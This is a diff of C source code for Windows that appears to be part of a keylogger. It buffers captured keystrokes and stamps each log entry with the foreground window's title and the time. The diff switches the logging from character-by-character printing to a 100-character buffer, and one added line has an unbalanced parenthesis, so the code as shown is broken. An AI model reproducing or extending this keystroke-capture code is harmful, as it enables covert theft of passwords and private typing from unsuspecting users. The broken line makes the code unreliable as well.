@@ -1,24 +1,31 @@
 #include "header.h"
 
 HWND window = NULL;
-WCHAR window_name[120]; // vérifier un de ces 4 si ça marche ne local
+t_str *str_chain;
 
 void edit_log(short character)
 {
-	if (window == GetForegroundWindow())
-		printf("%c", character);
-	else
+	if (character)
 	{
-		window_title();
-		printf("%c", character);
+		if (window == GetForegroundWindow())
+			str_chain = add_str(str_chain, 0, character);
+		else
+		{
+			print_str(str_chain);
+			window_title();
+			str_chain = add_str(str_chain, 0, character);
+		}
 	}
+	if (cpt_index(str_chain) == 100)
+		str_chain = print_str(str_chain));
 }
 
 void window_title(void)
 {
 	SYSTEMTIME time;
+	WCHAR window_name[120];
 
-	//put_file();
+	
 	GetSystemTime(&time);
 	printf("\n\n# [ %d / %d / %d ]\n# %d:%d\n",	time.wDay, time.wMonth, time.wYear,
 											time.wHour, time.wMinute);
